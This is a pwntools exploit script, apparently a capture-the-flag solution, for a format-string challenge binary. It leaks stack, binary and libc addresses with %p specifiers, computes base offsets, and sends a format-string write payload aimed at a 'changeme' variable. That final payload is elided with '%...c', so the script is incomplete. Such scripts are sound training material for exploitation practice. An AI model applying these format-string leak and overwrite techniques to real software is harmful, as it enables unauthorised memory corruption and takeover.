#!/usr/bin/python3

from pwn import *

exe = ELF("./fsb_overwrite_patched")
libc = ELF("./libc.so.6")
context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+59
        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()
s(b'%8$p')
stack = int(p.recvline()[:-1],16)
log.info("stack :" + hex(stack))

s(b'%15$p')
binary_leak = int(p.recvline()[:-1], 16)
binary_base = binary_leak - 0x1293
log.info("binary_leak :" + hex(binary_leak))
log.info("binary_base :" + hex(binary_base))

s(b'%13$p')
libc_leak = int(p.recvline()[:-1],16)
libc.address = libc_leak - 0x29d90
log.info("libc_leak :" + hex(libc_leak))
log.info("libc_base :" + hex(libc.address))

changeme = binary_base + 0x401c

s(b'%c%c%c%c%c%c%c%c%c%c%c%c%c%c%...c')

p.interactive()

